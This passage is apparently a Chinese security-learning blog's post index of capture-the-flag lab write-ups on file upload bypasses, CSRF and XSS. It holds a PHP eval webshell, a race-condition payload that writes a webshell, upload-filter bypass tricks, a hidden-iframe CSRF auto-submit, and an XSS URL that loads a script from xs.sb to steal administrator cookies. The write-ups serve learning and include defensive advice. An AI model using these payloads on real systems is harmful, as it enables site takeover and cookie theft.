)现在采用的就是白名单了,strrpos返回.最后一次出现得位置,然后substr截断赋值给file_ext,就是说获得后缀名,如果后缀名不匹配那就失败)尝试这样截断但是失败了,发现图片还被重命名了)但是还发现有一个存储路径)尝试修改))果然图片被存放到了该目录下,放到了a.php下,还被重命名了.)))这样图片就会被保存在a.php下,用图片去访问该图片,到php时就会被截断,读取不到jpg,从而用php代码去解析这张图片,达到了getshell pass-12 0x00截断 )这题是把get传参path变成了post.所以这和以前得那个宽字节注入第三题一样得改,url是会进行url编译得,但是post不会,post得改成十六进制得0x00截断)在path后加个a方便认出,然后改成00,变成0x00截断放包,后来发现不是这样改path得…)目录在最下面,应该加在下面,修改hex后成功出来 pass-13 0x00截断 13-16都是一样的 pass-17 条件竞争 首先了解一个定义一竞争 条件是什么?竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区(criticalsection)，如果没有应用好同步技术则会发生“竞争条件”问题。在我理解就是两只哈士奇(线程)同时去抢一个丢出去的飞盘(资源)，不知道到底哪只能抢到，此处便形成了竞争。那我们上传是和谁去竞争?一般而言我们是上传了文件，上传了但是最后却因为过滤或者因为其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和unlink，是和删除文件的函数进行竞争。假如我不断的上传发包，然后我同时也不断的访问那个我们上传上去的文件的地址，我们就开始和服务器的函数比手速了，函数执行都是要时间的，如果我这边上传上去，且没有删除，那个时间可能很短，然后被我访问到了，岂不是就可以执行PHP了我就比服务器手速快了&lt;?php $a = &#39;&lt;?php @eval($_REQUEST[\\&#39;a\\&#39;])?&gt;&#39;;file_put_contents(&#39;1.php&#39;,$a)?&gt;上传文件后,先验证还是先执行?如果是先上传上去然后校验,不符合删除那么服务器删除文件需要时间—-&gt; 0.01s?0.0001?0.0000001?不管怎样总是需要时间得在这期间100个线程不间断的访问这个文件 –&gt;究竟是线程先访问到还是文件删除?–&gt;只要访问得快,他就无法被删除,从而getshell&lt;–&gt;(自己经常因为某些文件正在使用而无法删除文件夹)但是如果访问过于密集被ban了那就没用了)(这串代码因为不是自己打的所以出错了很久,中间多了好几个空格,最后通过本地环境测试出来是代码有问题得)需要用过这句代码,file_put_contents()函数就是把变量a输入到1.php中去.没有1.php就会创建一个一般长传得文件在服务器端会经历 接收-&gt;转移-&gt;验证这个过程这边开始实战先上传一张jpg图片可以得到文件保存在服务器得地址,然后开始改后缀放到爆破模块,随便add个地方,然后设置no playload跑10000次,线程数设置成40,因为没有playloads,所以就是长传这个123.php10000次得意思是然后再去访问这个tj.php,设置线程60,也跑10000次很明显有几个是抢成功了数据包明显很长,里面是phpinfo信息可以在本得得环境里看到1.php确实已经上传了而且没有被重命名.Pass-18 同17也是条件竞争.并不难,需要搞清楚上传什么,访问什么就好.一开始我直接去访问1.php了.这必然是错的.另外,上传得速度比访问得速度要快才出来得,按道理说上传得比访问得慢才行 Pass-19 move_uploaded_file()截断 )15年的漏洞,存在于php5.4,5.5,5.6)一进去先试了一张正常的图片)发现有个叫保存名称的东西)打开后发现名字被重命名成刚刚的保存名称了,抓包截断试一下,让他保存成php)在最后找到这个保存得文件名称,改成这样然后去修改十六进制)已经getshell了菜刀连接getshell总结:move_upload_file函数是将上传的文件进行转移,但是转移的过程中碰到了00截断,于是只上传了截断之前的命名,从而造成了截断","path":"2020/04/06/文件上端漏洞-10-20-zkaq/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件上端漏洞(1-10)--zkaq","text":"pass-01 )这是一个前端验证,因为上传不是规定的文件之后会弹出提示框但是burp抓不到数据包,所以直接使用burp绕过即可)可以看到Content-Type允许的类型是image和jpg,把自己的123.jpg改成123.php后上传,成功了(123.jpg是自己制作的图片马))复制图片地址后打开此时如果传入参数a就会有上图的结果显示因为你得123.php上传到服务器了,被存储在了服务器内(想象csrf那课的文件管理)然后去访问123.php就行,a随便传参,eval让他都会当作代码执行 pass-02 做法同第一题 pass-03 )尝试抓包修改后缀绕过,失败了发现这次是后端检测后缀名,所以光是前端绕过没有用.可以用其他可以被解析的文件后缀来代替.此外还有， php: php phtml php3 php4 php5,这些都会被当成php解析,所以有时可以拿phtml啥的去试一试mark)这时候又上传成功了明显,再使用菜刀去连接 pass-04 这个文件就像你点外卖时候的备注,商家(服务器)会按你得备注(.htaccess文件)去做’虽然这个给文件功能很强大,但是一般默认不开启.(ngx和伪静态一般会用)这样制作一个htaccess文件,里面大致内容是把jpg文件当成php文件去解析但是手动是无法保存的因为没有文件名,必须使用cmd命令这是就完成了,上传123.jpg图片后,复制图片地址打开依旧是图片,然后再上传.htaccess文件服务器就按着中间件.htaccess文件同php去解析jpg了pass-05 第五题过滤了一堆东西,刚刚的基本都过滤了包括.htaccess)但是windows的后缀名试不区分大小写的,所以可以这样成功执行pass-06 这边开发又聪明了连大小写都开始防范了.但是呢,windows去解析文件的时候,会把php空格当成php去执行的.随意上传的时候上传php空格就行.后端验证的时候接收的是’php空格’是在字符串里的,’php空格’却是不等于’php’的,毕竟空格也是一个字符,所以这边只要上传php空格后缀名即可Getshell了pass-07 又加了一条首位去空函数,现在又得用新姿势了Windows下,在后缀名后面加上一个点.,他会提示你后缀名不可用然后把,给去掉,于是又可以利用一波成功getshell pass-08 ::$DATA (Windows文 件流绕过) (这 里利用到了NTFS交换数据流(ADS) ，ADS 是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其它文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。)将abcd输出到1.txt,如果没有1.txt就会自动创建一个,然后将abcd存进去删除1.txt后,在输出echo abcd&gt;&gt;1.txt:2.txt桌面又会出现一个1.txt但是打开什么都没有,甚至文件大小都是0kb,因为东西在寄宿者2.txt身上,使用cmd’打开隐藏的东西就出来了,藏东西利器啊!如果你写echo &gt;&gt;1.txt:会怎么样?会变成echo &gt;&gt;1.txt::$DATA,这是自动填充的但是打开时能够看到东西的,其实平时创建文件就会自动填充::$DATA的,只是不显示给我们看罢了,所以我们可以使用这个来绕过!(自己把::$DATA填充完整来让验证匹配不上,但是这个只在Windows下有效!)))这是把::DATA去掉才能访问,因为数据库里没有123.php::$DATA这个文件!之前的123.php.也没有,但是windows会自己把.给去掉! pass-09 得,这下又把::$DATA去掉了.但还是可以绕过得,这需要从逻辑上去考虑按照过滤顺序,先去掉.在转换大小写,再去掉空格,那么可以这样123.php. .去完之后时123.php.又回到了之前))成功getshell也终于在虚拟机上连接上菜刀了,本机死活不行不晓得为啥.这边猜想应该123.php.::$DATA,123.php::$DATA 应该也是可以得,去尝试一下,经实验发现,前面一个是行得通得后面一个被发现了,仔细研究代码后发现代码删去点和删去::$DATA是有区别得,删除点只是删在文件末尾得,而删去::$DATA是匹配删去,所以躲在哪里都不行 pass-10 )开发火了,干脆把出现php得直接给删除了!(用””替换了”php”)但是这样也是可以绕过得,变成123.pphphp,删完之后就变成了123.php!!!)成功getshell 至此,黑名单类靶场已经结束了","path":"2020/04/06/文件上端漏洞-1-10-zkaq/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"zkaq文件上传漏洞(三)","text":"ASP 是什么？ ASP 指 Active Server Pages （动态服务器页面） ASP 是一项微软公司的技术 ASP 是在 IIS 中运行的程序 IIS 指 Internet Information Services （Internet 信息服务） IIS 是 Windows 2000 及 Windows 2003 的免费组件 IIS 同时也是 Windows NT 4.0 的可选组件 此可选组件可通过因特网下载 PWS 的体积更小 - 不过拥有 IIS 的完整功能 PWS 可在 Windows 95/98 的安装 CD 中找到 ASP 文件和 HTML 文件类似 ASP 文件可包含文本、HTML、XML 和脚本 ASP 文件中的脚本可在服务器上执行。 ASP 文件的扩展名是 “.asp” ASP 和 HTML 有何不同？ 当浏览器请求某个 HTML 文件时，服务器会返回这个文件 而当浏览器请求某个 ASP 文件时，IIS 将这个请求传递至 ASP 引擎。ASP 引擎会逐行地读取这个文件，并执行文件中的脚本。最后，ASP 文件将以纯 HTML 的形式返回到浏览器。ASP 能为你做什么？ 动态地编辑、改变或者添加页面的任何内容 对由用户从 HTML 表单提交的查询或者数据作出响应 访问数据或者数据库，并向浏览器返回结果 为不同的用户定制网页，提高这些页面的可用性 用 ASP 替代 CGI 和 Perl 的优势在于它的简易性和速度 由于 ASP 代码无法从来浏览器端察看，ASP 确保了站点的安全性。 优秀的 ASP 编程可将网络负载降至最低其实asp文件就和html,php是差不多的脚本语言,其实就是一个容器 Asp特性 )))就是说asp后缀的如果不让上传可以用这些绕过,这些事iis的特性,会把cer,asa也用asp去解析 Asp漏洞 在一般得语言中,分号是结束一句代码得意思.在asp文件中,分号还能有着截断得作用,类似于0x00和%00 于是就可以这样as.asp;.jpg但也是和00截断有一点区别,当上传成功后去url中访问00截断需要把阶段以后的给删掉访问,但是asp这里就不需要,依旧要写在url中要记得这是6.0特有的漏洞Asp可能要被淘汰了,因为主流是php CGI解析漏洞 CGI（Common Gateway Interface），即通用网关接口，是WWW技术中最重要的技术之一，是外部应用程序（即CGI程序）与WEB服务器之间的接口标准，负责在CGI程序和Web服务器之间传递信息。CGI是Web服务器运行时，调用外部应用程序（即CGI程序）的规范，CGI规范允许Web服务器执行外部程序，并将它们的输出发送给Web浏览器，CGI将Web的一组简单的静态超媒体文档变成一个完整的、新的交互式媒体，按照CGI编写的程序可以扩展Web服务器功能。可以把他理解为一个收发文件的)就是说,这个函数查找绝对路径时会做两步,先找到phpinfo.jpg/1.php发现没有这个路径,但有这个文件,就后退一个,路径就变成phpinfo.jpg,把1.php当成文件处理.但是他查找后缀名时,就直接从最后找这个漏洞16年比较盛行,现在防范的比较多,,不过最近又有新的漏洞了nginx,可以去安全客查看利用直接在文件路径后加上/.php即可,看pass-23实操","path":"2020/04/06/zkaq文件上传漏洞-三/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"zkaq文件上传漏洞(二)","text":"%00截断 了解%00实际上我们要先了解0x00, 0x00实际上是一个十六进制表示方式，实际上就是表示ascii码值为0，有些函数在处理这个字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了这有什么用呢? 在文件上传时，如果遇到了白名单机制只允许上传jpg后缀的，在没有解析漏洞的情况下我们该怎么办?JPG格式并不会被解析，那么我们需要绕过上传过滤。假如我写了1.php%00.jpg传参之后，有些过滤都是直接匹配字符串，他强行匹配到了结尾是jpg，然后允许上传，但是php的丽数去执行的时候他读取到0x00认为结束了，那么这个文件就变成了1.php 00截断 %00实际.上和00截断是一模一样的原理，只不过%00是经过URL编码的，%00解码后就是0x00截断的那个字符建议多使用gif木马,因为不会被二次渲染.有些二次渲染是有一部分不会变,另一部分会改变得,可以通过加在不变得地方来防止被渲染","path":"2020/04/06/zkaq文件上传漏洞-二/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"zkaq文件上传漏洞(一)","text":"客户端检测 客户端校验: - -般是在网页上写一段Js脚本，用Js去检测，校验上传文件的后缀名，有白名单也有黑名单。判断方式:在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如:只允许上传jipg/jpeg/ .png后缀名的文件，而此时并没有发送数据包，所以可以通过抓包来判断，如果弹出不准上传，但是没有抓到数据包，那么就是前端验证前端验证非常不可靠，传正常文件改数据包就可以绕过，甚至关闭JS都可以尝试绕过白名单:允许什么,,黑名单:不允许什么 (一般白名单比白名单更安全)服务器端检测 服务端检测几个常见的手段: 1.检查Content-Type (内容 类型)2.检查后缀( 检查后缀是主流)3.检查文件头如何绕过Content-Type (内容类型)和文件头检测，这个时候我们就要去制作一个图片马了图片马的制作很简单，写一个一句话木马放在txt文件然后找- -张你喜欢的图片(注意文件大小，越小越好)然后打开cmdcopy a.jpg/b+ 1.xt 123.jpg (将a.jpg和1.txt 合并为123.jpg (注: 这个是效果))图片马可以很好的绕过内容类型和文件头,这个a.jpg越小越好/b的意思是用二进制去执行.新的图片打开后划到最小面会有这句任意代码执行函数出现 小知识点 如何用图片藏东西?把机密.txt压缩后和一张图片合并,合并成了一张图片,普通人看就是一张图片,但是你把他后缀名改成zip之后会发现机密.txt就在里面) 为何制作木马图的图片要比较小?因为去解析这个php代码的时候一直碰到不认识的,那就继续往下找,但它不是一直往下找的,如果超过了某个阈值就会停止导致一句话木马没有被执行 图片马上传成功后就可以使用菜刀去连接","path":"2020/04/06/zkaq文件上传漏洞-一/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"CSRF--zkaq靶场","text":"进入管理员后台 进入到后台登录界面(./dede),通过爆破进入到后台.进入到文件式管理器,发现可以新建文件.直接新建一个一句话木马.)然后去访问成功getshell了 csrf )新建一个phpinfo()文件,点击保存抓包.)使用burp自带工具制作成csrf攻击代码,复制创建的代码保存,修改成html文件.退出登录试试刷新token,然后点击发现直接跳转到后台页面了说明是存在csrf的.如果觉得需要手动点击太明显,那就改成自动触发 function validate(){document.getElementById(&apos;aa&apos;).submit(); } setTimeout(validate,100) 再隐蔽一点,自己做钓鱼网站,然后再index.php里面加入一句&lt;iframe src=&quot;(目录下的scrf攻击代码的文件名)&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;这样人家点击你的钓鱼网站之后就会自动触发你写的攻击代码,并且直接调用里面的函数,在index.php下生成一个内置网页,高宽都是0还都看不见.然后flag就在csrf目录下疑问 这边后台创建完文件之后都可以直接getshell了,为啥还要csrf?又去听了一遍课程,这个靶场只是告诉你如何去实现csrf攻击,自己充当了攻击者和管理员的角色.管理员在登陆过后有cookie之后,点击了你的钓鱼网站,你就会获得他的信息了,也可能会自动创建账户什么的(看你恶意代码怎么写了)","path":"2020/04/05/CSRF-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"CSRF","slug":"CSRF","permalink":"http://wxnsoul.github.io/tags/CSRF/"}]},{"title":"CSRF","text":"定义 CSRF (Cross-site request forgery)跨站请求伪造:也被称为“One Click Attack”或者Session Riding,通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS) ，但它与XSs非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击 相比，CSRF攻击往往不大流行(因此对其进行防范的资源也相当稀少)和难以防范，所以被认为比XSs更具危险性。其实说白了，csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能(比如是添加账号等) 缺点与防范 核心在于缺乏验证 像验证码是他最好的防御方法修改密码,我们要输入一个验证码做任何操作都加个验证码其实完全杜绝CSRF 开发他们为了安全设置了-个东西叫做Token,是一个验证机制每个请求的表单里面都存在着一个字段，这个字段就是Token,他会随机生成一段字符串,然后cookie里面也带有这段字符串.如果用户发起请求的token字段和服务器端的不一样就会认为这不是你本人访问的就会拒绝访问,原理和验证码差不多. 小知识点 一个网页如果没有token,就可以去尝试csrf 抓包时Token不一定就叫token,可能会被改成其他名字,什么uid拉什么什么的.最简单的验证是不是token的办法注册两个账号然后抓一一个账号的包,然后制作成CSRE攻击然后换一个账号去触发,看看是否有效果 Referer是请求头里的一部分,用于告诉浏览器你是从哪个网站过来的,如果是主动进来的就不会有referer.虽然他能起到一定的防御作用,但是这个是可以伪造的……只有cookie是最好的验证手法 csrf再src平台上可能会被定为小危险,然后不给你钱,自己再偷偷修复??? 测试csrf流程 先注册一个账号,然后抓取数据包,burp里有一个这个功能可以直接制作带有csrf的html代码,然后保存成html文件. 再注册一个账号,此时去打开刚刚保存的html文件,如果刷新第二个账号后发现内容发生了变化则说明存在有scrf漏洞 其实burp害怕黑客去去攻击别人所以做的比较柔和,需要点击才会触发,但是把点击事件去掉,改成直接调用函数(如下图)就变成了自动触发(恶意代码是被封装在一个js函数里的) 疑问 为啥执行了phpinfo之后就说取得了webshell?因为phpinfo是代码,不是系统命令.而取得了webshell之后是可以执行php代码的,所以说如果可以执行phpinfo就可是getshell了 靶场实战 传送门:https://wxnsoul.github.io/2020/04/05/CSRF-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/CSRF/","date":"04-05","excerpt":"","tags":[{"name":"CSRF","slug":"CSRF","permalink":"http://wxnsoul.github.io/tags/CSRF/"}]},{"title":"Dom Based XSS--zkaq靶场","text":"测试发现 进入发现这是一个聊天室,有很多很多的提交框,自然会想到&lt;script&gt;alert(1)&lt;/script&gt;)很不幸直接被发现了)直接被拦截了,因为cookie信息一直在所以刷新是没有用的,手动找到后删除cookie信息继续恢复正常访问然后一个一个地方试了下发现名称的地方试不可以xss的,所以被拦截这里就需要使用burp了,很多前端的拦截burp就可以绕过去Burp是用于寻找输出点最好的工具)抓包把浏览器中有框框的地方全部给改成alert(1)传过去,但是没有什么用处,这时候就需要查看页面源代码来寻找其余可以插入的地方.)这时候发现这个您所在的位置这里很可以,可能是服务器端发送过来的,因为随便输入的数据也会跟在后面显示)查看页面源码,直接就是document.write写我url栏里输入的,所以这边肯定是服务器端发送过来的(如果是客户端的他不会知道我要输入啥),可以考虑尝试一下直接写入不行,转native编码后绕过就可以了)接着尝试使用比较老套的绕过旧waf的方法)确实奏效了,只是没有注意闭合问题)这样也不行,,最后添加上//后又被安全感拦截了改成这样,用分号结束一段语句,最后闭合,成功弹出! mark因为已经是服务器端传来的,所以这段代码已经在数据库中变成了存储型xss,此时再在别的地方&lt;script&gt;alert(1)&lt;/script&gt;就不会被拦截了,比如在字体里输入))也可以这样直接闭合来输出.因为html的优先级高于js,所以两个script标签会直接先闭合,最后加上//注释符也可以,这就是html的高容差性.注:一开始自己这么尝试的不行就是因为没有闭合标签在xs.sb搭建xss代码后将恶意代码输入到地址栏,成功看到有内容访问)看tips根据tips去访问dom.php?url=这其实是个模拟静态页面生成的 页面将刚刚的恶意代码放在url后面,他就会去访问这个你写的网址,这时候再去访问log.html,就会加载出来刚刚访问的,这个页面里面有用py写的脚本,会去不停的访问这个dom.php?url&gt;里的页面","path":"2020/04/05/Dom-Based-XSS-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"Dom Based XSS","slug":"Dom-Based-XSS","permalink":"http://wxnsoul.github.io/tags/Dom-Based-XSS/"}]},{"title":"Dom Based XSS","text":"前言 原本不应该XSS的地方,但是经过js的操作之后产生了xss.比如说,后端过滤了script,但是js可以把+号变成p,那我传入scri+t不仅没有被过滤,在js的操作下又变成了script.这个情况不是都有也不是都没有,可能会存在. 核心 document是可以被操作的网页,可以被js操作比如说document.cookie(cookie注入的时候))Xss平台窃取cookie的时候其实就使用了document.cookie这样的东西 漏洞的产生 DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。 DOM—based XSS攻击原理 DOM—based XSS攻击源于DOM相关的属性和方法，被插入用于XSS攻击的脚本。一个典型的例子如下所述。H TTP请求http：／／www．DBXSSed．site／welcome．html?name=zhangsan使用以下的脚本打印出登录用户zhangsan的名字，即如果这个脚本用于请求http：／／www．DBXSSed．site／wPJconle．html?name=&lt;script&gt;alert(&quot;XSS&quot;)&lt;／script&gt;时，就导致XSS攻击的发生。当用户点击这个链接，服务器返回包含上面脚本的HTML静态文本，用户浏览器把HTML文本解析成DOM，DOM中的document对象URL属性的值就是当前页而的URL。在脚本被解析时，这个URL属性值的一部分被写入HTML文本，而这部分HTML文本却是JavaScript脚本，这使得&lt;script&gt;alert(“XSS”)&lt;／script&gt;成为页面最终显示的HTML文本，从而导致DOM—base XSS攻击发生。DOM—based XSS攻击过程如图l所示。注意（5）黑客提供的URL被页面的JAVASCRIPT使用，生成攻击载荷。 小知识点 Js这个东西他是在客户端运行的,不占用客户端端资源 伪静态网页:会刷新,使用document.lastModified不断刷新看看时间是否发生变化,变化的就是伪静态.完全静态的页面时无法注入的 Document.write会在页面输入信息)但是要记得他是js语句,js会解码某些编码,比如native编码)ASCII转native之后在输出成功的弹出了1,所以有些时候可以考虑用编码来绕过 寻找xss漏洞最好使用burp抓包,传数据之后可以在burp里进行修改以此来绕开前端的防护,有框就插 dom型xss既可以时反射性,也可以是存储型,就像延时注入和布尔盲注一样都是盲注.dom型到底属于哪一类就看有没有js的参与.有就是存储型,没有就是反射型 XSS解决方案常用的防止XSS技术包括： 与SQL注入防护的建议一样，假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅要验证数据的类型，还要验证其格式、长度、范围和内容。 不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。 在发布应用程序之前测试所有已知的威胁。 靶场地址 传送门: 原文地址 https://www.cnblogs.com/phoenix--/articles/2158202.html","path":"2020/04/05/Dom-Based-XSS/","date":"04-05","excerpt":"","tags":[{"name":"Dom Based XSS","slug":"Dom-Based-XSS","permalink":"http://wxnsoul.github.io/tags/Dom-Based-XSS/"}]},{"title":"存储型XSS--zkaq靶场","text":"漏洞复现 一上去发现是finecms,存在通杀漏洞,百度查找前人留下的文章即可注意,遇到通杀型漏洞一定要本地搭建本地复现线上实战去a5源码站下载源码,一定要安装在3W,80端口的根目录下!(finecms的bug)如果环境搭建好之后访问时说数据库出错,连接不上数据库,那是因为这源码别人家用过了安装了她自己机子上的数据库,然后被你扒下来了,所以连接不上数据库,重新访问install安装即可)根据mvc架构的一个传参方式输入c和m的参数就可以实现js弹窗 http://59.63.200.79:8082/index.php?c=mail&amp;m=%3CsCRiPt%20sRC=//xs.sb/QeiH%3E%3C/sCrIpT%3E直接传入恶意代码可以发现自己的xss平台上就会有cookie了然后等待管理员点击错误日志就行,因为靶场被设置了每隔一会就会去点击,所以等待一会即可找到flagzKaQ-01sdfDCo0 流程总结 搭建本地环境实现漏洞复现,并找到存储型漏洞如何实现 搭建xs平台,按照漏洞实现方法插入恶意代码(靶场中是mvc框架传参,直接把参数改成sx平台的恶意代码) 等待管理员查看错误日志,获取cookie","path":"2020/04/05/存储型XSS-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"存储型XSS","slug":"存储型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"}]},{"title":"存储型XSS","text":"介绍 存储型XSS会把恶意代码嵌入到服务器端,这样每个用户去访问都会把服务器端的恶意代拿回到浏览器端核心:写的进去,输的出来,写的进去是指比如注册填写账号密码邮箱啥的,你得代码输进去了,登进去发现又昵称,姓名的显示那这就是可以输出.密码就属于输不出来打网站要先正常走一遍看情况,不要一上来就去尝试xss有些时候传参会很隐蔽,建议抓包修改前言 一些xss平台会可以看到你浏览器内的cookie,所以建议登录的时候要用一个不常用的浏览器或者使用谷歌的无痕模式这次我登录的是xs.sb/xss.php,注册登录后,如果只需要窃取cookie,那就点击xss.js和默认模式两个,然后下一步会有源码和教你如何使用的样例出现 Xss的克星 被过滤 长度限制 [我们用户名那个地方存在XSS但是那个地方最多显示10个字符]浏览器端可以修改但是服务器端如果被限制了那就没有用了所以实在没有办法可以使用上图中的极限代码 小知识 一.遇到通杀型漏洞一定要本地搭建本地复现线上实战 1.出了错很懵逼2.你打过去了能成功的几率自己也不知道，然后结果过了N久打到了，但是你已经不关注网站了。3.打过去直接炸了二.cms有bug,必须通过127.0.0.1和80端口访问,就是只能在根目录下,127.0.0.1/a都不行 上课举例 上课举例(搭建环境):将这段攻击代码复制后在靶场的留言台的主题输入,然后项目里就会出现访问记录 ))使用burp抓包发现,这段代码导致你会去访问xs.sb下的某个地方甚至带着cookie发了过去 漏洞复现 接着是漏洞复现搭建靶场,注意看前面的小知识点.如果环境搭建好之后访问时说数据库出错,连接不上数据库,那是因为这源码别人家用过了安装了她自己机子上的数据库,然后被你扒下来了,所以连接不上数据库,重新访问install安装即可))装好了之后进入后台可以发现错误日志的url)修改后可以发现)后台显示也跟着改了.百度finecms存储型xss后可以发现有通杀)根据mvc架构的一个传参方式输入c和m的参数就可以实现js弹窗前台的防护一般比后台高,前台能弹窗后台一定也能 这是就可以搭建一个xss站点来钓鱼,依旧使用xs.sb/xss.php来创建项目这边就可以直接插入恶意代码来窃取cookie(注意m的传参是什么?是搭建的xs平台里面的存储型代码!!)过一阵子只要等管理员点击到日志就会被窃取cookie 靶场地址 传送门:https://wxnsoul.github.io/2020/04/05/%E5%AD%98%E5%82%A8%E5%9E%8BXSS-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/存储型XSS/","date":"04-05","excerpt":"","tags":[{"name":"存储型XSS","slug":"存储型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"}]},{"title":"反射型XSS--zkaq靶场","text":"题目分析 这边有输入框就直接尝试输入&lt;script&gt;alert(1)&lt;/script&gt;回车后发现上面也会出现一行没有找到…结果,查看源码)可以发现上面的尖括号是被过滤了的,但是这个提交框的没有.肯定选择从提交框入手.这次注意闭合重新尝试&quot;&lt;script&gt;alert(1)&lt;/script&gt;//)查看源码可惜发现双引号被转移了. 利用html的高兼容性 单引号可以闭合双引号,所以改用单引号 ‘alert(1)//点击输入后有相关结果提示但是输入框里的东西没了,说明刚刚的被当作html代码执行了 事件型触发xss 刚刚第一种方法失败了,所以尝试第三种方法触发xss这时候用oninput标签,意义是输入框里要是输入东西就会产生弹窗.再输入1,就出flag了 &#39;oninput=alert(1)//因为弹窗弹的东西被nf修改了所以弹出的不是自己写的1所以关键处还是在于找到可用的输入输出点 &lt;script&gt;alert(1)&lt;/script&gt;这句话竟然直接在blog跳出弹窗了…疑问解决 做题的时候碰到一个疑问)我一开始以为//把后面的”&gt;全给注释了,是html的高兼容性导致代码成功执行了.然后想自己把”&gt;补全)但是这样却不能触发xss了.后来问过辅导员之后明白了,//注释的是js代码,oninput就是js代码,它注释的是这个单引号,而后面的”&gt;是html代码,html代码的注释是&lt;!- 注释的内容 -&gt;.所以自己再填加”&gt;后就会出现冗余的”&gt;,导致html代码错误无法加载出js代码","path":"2020/04/05/反射型XSS-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"反射型XSS","slug":"反射型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"}]},{"title":"反射型XSS","text":"XSS得原理分析与解剖 核心:HTML代码注入,用户输入得数据会被当作HTML代码执行(这里的HTML指的是前端所有语言, Xss.主要就是调用Js业内一般把弹窗函数作为一个存在xss的认定)总结:xss就是拼接恶意的HTML代码 简单演示 &lt;?php echo $_REQUEST[&#39;a&#39;]; ?&gt;这是很简单得一段php源码普通用户执行)不做任何过滤可以拼接html语句市面上一般以弹窗语句作为可以xss得标准为什么通过弹窗判定?因为XSS攻击如果需要达到真正的利用需要调用JsCookie是保存在浏览器里面的,Js可以调用浏览器来获取你的cookie同源性法则 只能获取同一个域名,端口得cookie,用户如果登陆过a站点但是没有登陆过b站点,那就只能偷到a站点得cookie 触发js得方法 1.&lt;script&gt;alert(1)&lt;/script&gt; 2.伪协议触发伪协议不同于因特网上所真实存在的协议，如http://, https://， ftp://,伪协议只有关联应用能够用，比如php:// tencent:/( 关联QQ)javascript:伪协议实际上声明了URL的主体是任意的javascript代码javascript:alert(1)3. 事件型触发法&lt;img src=’a ‘onerror=alert(1) /&gt;只要满足条件就不会触发,不满足条件就会促会发onerrer里面写的总结:三种方法比较:第一种比较容易,但也是最多被防护得,经常会被过滤&gt;;/等符号第二种用到的很少,比较鸡肋第三种就是平时挖洞常用的 HTML前端语言特点 拥有相当高的容错性,因为是直接和用户交互的,所以必须容错性高,不然影响用户体验,换句话说,#代码中哪里对的就执行,哪里错的就不执行#.而后端动态语言就不会这样,碰到错误就停止 Xss类型 反射性xss在src上一般是认为是鸡肋的,在项目上可能会认为是中危最常见的情况A网站存在了反射型xss那么偷别人Cookie . 1.人家登陆了A站且没失效2.人家访问你发送过去的链接 你关闭页面但是cookie还在浏览器和服务器端,你关闭浏览器只是删除了浏览器上的cookie! 操作思路: 